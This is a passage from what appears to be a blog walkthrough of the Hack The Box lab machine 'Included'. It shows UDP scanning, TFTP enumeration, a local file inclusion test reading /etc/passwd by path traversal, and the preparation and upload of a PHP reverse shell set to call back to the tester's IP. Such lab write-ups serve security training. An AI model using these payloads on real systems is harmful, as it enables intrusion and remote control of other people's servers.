</span></span></code></pre></div><p>Interestingly enough, there are <strong>two redirections</strong> in place:</p><ul><li>0 - <em>http://$rhost</em> - landing page</li><li>1 - <em>http://$rhost/index.php?file=home.php</em> - first <strong>redirect</strong></li><li>2 - <em>http://$rhost/?file=home.php</em> - second <strong>redirect</strong></li></ul><p>Anyway, these <strong>urls</strong> seem quite <strong>dangerous</strong> with that <em>file</em> parameter, but let&rsquo;s leave that for later. For now, since the question mentions <strong>udp</strong> ports, let&rsquo;s scan those port&rsquo;s too. (Note: scanning the udp ports on the target requires root privileges)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -sU --min-rate <span class=m>5000</span> -p- <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-23 15:04 BST
</span></span><span class=line><span class=cl>Warning: 10.129.112.221 giving up on port because retransmission cap hit <span class=o>(</span>10<span class=o>)</span>.
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.112.221
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.059s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65350</span> open<span class=p>|</span>filtered udp ports <span class=o>(</span>no-response<span class=o>)</span>, <span class=m>175</span> closed udp ports <span class=o>(</span>port-unreach<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>39623/udp open  unknown
</span></span><span class=line><span class=cl>47052/udp open  unknown
</span></span><span class=line><span class=cl>54212/udp open  unknown
</span></span><span class=line><span class=cl>54319/udp open  unknown
</span></span><span class=line><span class=cl>55618/udp open  unknown
</span></span><span class=line><span class=cl>57357/udp open  unknown
</span></span><span class=line><span class=cl>57647/udp open  unknown
</span></span><span class=line><span class=cl>58096/udp open  unknown
</span></span><span class=line><span class=cl>60359/udp open  unknown
</span></span><span class=line><span class=cl>60980/udp open  unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 169.70 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>That&rsquo;s not too encouraging&mldr; How about if we stick to only the <strong>most common ports</strong>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -sU <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-23 15:34 BST
</span></span><span class=line><span class=cl>Stats: 0:03:18 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing UDP Scan
</span></span><span class=line><span class=cl>UDP Scan Timing: About 20.98% <span class=k>done</span><span class=p>;</span> ETC: 15:49 <span class=o>(</span>0:12:26 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Stats: 0:09:32 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing UDP Scan
</span></span><span class=line><span class=cl>UDP Scan Timing: About 58.00% <span class=k>done</span><span class=p>;</span> ETC: 15:50 <span class=o>(</span>0:06:55 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.112.221
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.011s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed udp ports <span class=o>(</span>port-unreach<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE         SERVICE
</span></span><span class=line><span class=cl>68/udp open<span class=p>|</span>filtered dhcpc
</span></span><span class=line><span class=cl>69/udp open<span class=p>|</span>filtered tftp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1024.02 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>That&rsquo;s much better. But what exactly are those two <strong>services</strong>? After a quick research, this is the information we end up with:</p><ul><li>dhcpc port 68 &ndash; probably a <strong>dhcp client</strong></li><li>tftp port 69 &ndash; trivial file transfer protocol &ndash; <strong>no user authentication!!!</strong></li></ul><p>That second part looks <strong>extremely promising</strong>. Let&rsquo;s check it out&mldr;only how can we do that?</p><p>A quick <strong>online search</strong> (again) lands as with the <a href=https://nmap.org/nsedoc/scripts/tftp-enum.html title=tftp-enum>tftp-enum</a> script which is available for <em><strong>nmap</strong></em>. It also mentions that it&rsquo;s only a reimplementation of <em><strong>tftptheft</strong></em> tool, and by following the provided link we can <strong>download</strong> a <strong>wordlist</strong> containing the most commonly used filenames that can be found on a <strong>tftp</strong> share.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ wget https://raw.githubusercontent.com/EnableSecurity/tftptheft/master/data/tftplist.txt
</span></span><span class=line><span class=cl>--2023-05-23 15:53:36--  https://raw.githubusercontent.com/EnableSecurity/tftptheft/master/data/tftplist.txt
</span></span><span class=line><span class=cl>Resolving raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span>... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
</span></span><span class=line><span class=cl>Connecting to raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.109.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>1420</span> <span class=o>(</span>1.4K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘tftplist.txt’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tftplist.txt            100%<span class=o>[===============================</span>&gt;<span class=o>]</span>   1.39K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 15:53:36 <span class=o>(</span>20.1 MB/s<span class=o>)</span> - ‘tftplist.txt’ saved <span class=o>[</span>1420/1420<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 1.4K May <span class=m>23</span> 15:53 tftplist.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Sadly, the <strong>enumeration</strong> does not find anything interesting. Be it because the share is empty or because file discovery is blocked. We do not know.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -sU -p <span class=m>69</span> --script tftp-enum.nse --script-args tftp-enum.filelist<span class=o>=</span>tftplist.txt <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-23 15:56 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.112.221
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.053s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>69/udp open  tftp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.94 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>But since that was a bust, let&rsquo;s try something else. A quick <strong>online research</strong> steers us towards a tool named <em><strong>tftp</strong></em>. But since it does not come preinstalled on the <strong>pwnbox</strong>, we will have to <strong>install it</strong> ourselves.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ apropos tftp
</span></span><span class=line><span class=cl>tftp: nothing appropriate.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo apt install tftp
</span></span><span class=line><span class=cl>Reading package lists... Done
</span></span><span class=line><span class=cl>Building dependency tree... Done
</span></span><span class=line><span class=cl>Reading state information... Done
</span></span><span class=line><span class=cl>The following NEW packages will be installed:
</span></span><span class=line><span class=cl>  tftp
</span></span><span class=line><span class=cl><span class=m>0</span> upgraded, <span class=m>1</span> newly installed, <span class=m>0</span> to remove and <span class=m>0</span> not upgraded.
</span></span><span class=line><span class=cl>Need to get 19.3 kB of archives.
</span></span><span class=line><span class=cl>After this operation, 54.3 kB of additional disk space will be used.
</span></span><span class=line><span class=cl>Get:1 https://deb.parrot.sh/parrot parrot/main amd64 tftp amd64 0.17-23 <span class=o>[</span>19.3 kB<span class=o>]</span>
</span></span><span class=line><span class=cl>Fetched 19.3 kB in 0s <span class=o>(</span>60.2 kB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>Selecting previously unselected package tftp.
</span></span><span class=line><span class=cl><span class=o>(</span>Reading database ... <span class=m>506084</span> files and directories currently installed.<span class=o>)</span>
</span></span><span class=line><span class=cl>Preparing to unpack .../tftp_0.17-23_amd64.deb ...
</span></span><span class=line><span class=cl>Unpacking tftp <span class=o>(</span>0.17-23<span class=o>)</span> ...
</span></span><span class=line><span class=cl>Setting up tftp <span class=o>(</span>0.17-23<span class=o>)</span> ...
</span></span><span class=line><span class=cl>Processing triggers <span class=k>for</span> man-db <span class=o>(</span>2.10.1-1~bpo11+1<span class=o>)</span> ...
</span></span><span class=line><span class=cl>Scanning application launchers
</span></span><span class=line><span class=cl>Removing duplicate launchers or broken launchers
</span></span><span class=line><span class=cl>Launchers are updated
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Once installed, we refer to it&rsquo;s <strong>man page</strong> for further information about it&rsquo;s usage (<em>man tftp</em>). Simply connecting to our <strong>target</strong> does not reveal anything interesting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ tftp <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>tftp&gt; status
</span></span><span class=line><span class=cl>Connected to 10.129.112.221.
</span></span><span class=line><span class=cl>Mode: netascii Verbose: off Tracing: off
</span></span><span class=line><span class=cl>Rexmt-interval: <span class=m>5</span> seconds, Max-timeout: <span class=m>25</span> seconds
</span></span><span class=line><span class=cl>tftp&gt; ^C
</span></span><span class=line><span class=cl>tftp&gt; ┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Coupled with the fact that there is <strong>no trivial</strong> way to simply <strong>dump</strong> the file list via <strong>tftp</strong>, we will probably have to resort to it&rsquo;s (unauthenticated) <strong>file upload function</strong>.</p><p>As for the answer, since we are restricted to a 4 character long string, we have a clear winner with <strong>tftp</strong>.</p><blockquote><p>tftp</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?</em></p><p>It is time to <strong>check out</strong> the <strong>webpage</strong> that our target is hosting. Once we fire up our <strong>browser</strong>, we are automatically <strong>redirected</strong> to - <em>http://$rhost/?file=home.php</em> -. Goofing around a bit, we notice, that all the links point back to the same landing page.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point//tier_2/included/webpage.png alt=webpage title=webpage></p><p>Using the <strong>Wappalyzer</strong> Firefox Extension we <strong>collect</strong> the following information:</p><ul><li>Front scripts: Google Font API</li><li>Web servers: Apache HTTP Server - 2.4.29</li><li>Programming languages: php</li><li>Operating systems: Ubuntu</li></ul><p>Maybe it can be of interest later on. But for now, it&rsquo;s time to return to the dangerous <strong>url</strong> that we are served with.</p><p><strong>Searching</strong> for something like - <em>file= vulnerability</em> - lands us the <strong>clear answer</strong>. But is it really vulnerable? One of the typical <strong>proof-of-concept</strong> way to test it is to try and load the <em>passwd</em> file with the - <em>../../../../etc/passwd</em> - path. (Note: this file should be accessible for all the users on the system.)</p><p>Accessing the <strong>endpoint</strong> using our browser provides us with the <em>passwd</em> file, ergo, our <strong>target</strong> is indeed <strong>vulnerable</strong> to <strong>LFI</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point//tier_2/included/lfi-test.png alt=lfi-test title=lfi-test></p><blockquote><p>local file inclusion</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the default system folder that TFTP uses to store files?</em></p><p>Building on the information obtained in TASK1 and TASK2, our idea is to use <strong>tftp</strong> to upload a <em><strong>php</strong></em> <strong>reverse shell</strong> and then use the <em>file</em> <strong>url</strong> parameter to <strong>run it</strong>.</p><p>But for that, we need to know <strong>exactly</strong> where our files will end up once we upload them via <em><strong>tftp</strong></em>. A quick <strong>internet search</strong> rewards us with <strong>default root directory path</strong>, - <em>/var/lib/tftpboot</em> -.</p><p>Let&rsquo;s try and <strong>enumerate</strong> that <strong>directory</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gobuster dir -u http://<span class=nv>$rhost</span>/?file<span class=o>=</span>/var/lib/tftpboot/ -w /opt/useful/SecLists/Discovery/Web-Content/tftp.fuzz.txt --exclude-length <span class=nv>0</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.112.221/?file<span class=o>=</span>/var/lib/tftpboot/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /opt/useful/SecLists/Discovery/Web-Content/tftp.fuzz.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Exclude Length:          <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/23 16:38:43 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>                          
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/23 16:38:44 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>No luck with the <em>tftp.fuzz.txt</em> wordlist. Let&rsquo;s try the <em>common</em> one.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gobuster dir -u http://<span class=nv>$rhost</span>/?file<span class=o>=</span>/var/lib/tftpboot/ -w /usr/share/wordlists/dirb/common.txt --exclude-length <span class=nv>0</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.112.221/?file<span class=o>=</span>/var/lib/tftpboot/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Exclude Length:          <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/23 16:39:44 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/Documents and Settings <span class=o>(</span>Status: 400<span class=o>)</span> <span class=o>[</span>Size: 301<span class=o>]</span>
</span></span><span class=line><span class=cl>/Program Files        <span class=o>(</span>Status: 400<span class=o>)</span> <span class=o>[</span>Size: 301<span class=o>]</span>  
</span></span><span class=line><span class=cl>/reports list         <span class=o>(</span>Status: 400<span class=o>)</span> <span class=o>[</span>Size: 301<span class=o>]</span>  
</span></span><span class=line><span class=cl>                                                 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/23 16:39:49 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Again, no luck this time. We move on.</p><blockquote><p>/var/lib/tftpboot/</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>Which interesting file is located in the web server folder and can be used for Lateral Movement?</em></p><p>Now it&rsquo;s finally time to get that <strong>reverse php shell</strong> going. We <strong>grab</strong> one of the most commonly used ones and we <strong>modify</strong> it to fit our needs.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span class=line><span class=cl>--2023-05-23 16:52:12--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span class=line><span class=cl>Resolving raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
</span></span><span class=line><span class=cl>Connecting to raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.108.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>5491</span> <span class=o>(</span>5.4K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘php-reverse-shell.php’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php-reverse-shell.php   100%<span class=o>[===============================</span>&gt;<span class=o>]</span>   5.36K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 16:52:12 <span class=o>(</span>42.5 MB/s<span class=o>)</span> - ‘php-reverse-shell.php’ saved <span class=o>[</span>5491/5491<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ vim php-reverse-shell.php 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mv php-reverse-shell.php revshell.php
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>We adjust line 49 and 50 accordingly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># original
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>;</span>  <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$port</span> <span class=o>=</span> <span class=mi>1234</span><span class=p>;</span>       <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># modified
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;10.10.14.75&#39;</span><span class=p>;</span>  <span class=c1>// local host
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$port</span> <span class=o>=</span> <span class=mi>4444</span><span class=p>;</span>       <span class=c1>// arbitrary port
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span></code></pre></div><p>Once <strong>uploaded</strong>,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ tftp <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>tftp&gt; put revshell.php
